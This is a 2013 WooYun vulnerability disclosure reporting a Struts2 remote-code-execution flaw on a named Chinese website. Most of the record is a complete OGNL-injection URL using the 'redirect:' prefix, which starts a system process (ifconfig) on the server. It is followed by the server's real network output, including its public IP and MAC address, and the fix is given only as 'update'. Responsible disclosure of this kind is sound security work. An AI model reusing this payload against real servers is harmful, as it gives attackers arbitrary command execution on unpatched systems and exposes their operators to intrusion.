wybug_detail: 漏洞详情 披露状态：   									2013-10-30：	细节已通知厂商并且等待厂商处理中									2013-11-03：	厂商已经确认，细节仅向厂商公开									2013-11-13：	细节向核心白帽子及相关领域专家公开									2013-11-23：	细节向普通白帽子公开									2013-12-03：	细节向实习白帽子公开									2013-12-14：	细节向公众公开  简要描述： st2 详细说明：  http://www.naee.com.cn/go_news.action?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(%22ifconfig%22)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D   漏洞证明：  eth0      Link encap:Ethernet  HWaddr 00:25:90:4D:73:4C            inet addr:118.123.253.130  Bcast:118.123.253.255  Mask:255.255.255.128          inet6 addr: fe80::225:90ff:fe4d:734c/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:577944867 errors:0 dropped:0 overruns:0 frame:0          TX packets:497316714 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:277550795891 (258.4 GiB)  TX bytes:274630120215 (255.7 GiB)          Memory:fafe0000-fb000000 lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:431897550 errors:0 dropped:0 overruns:0 frame:0          TX packets:431897550 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:697107974723 (649.2 GiB)  TX bytes:697107974723 (649.2 GiB)   修复方案：  更新   版权声明：转载请注明来源 川川@乌云
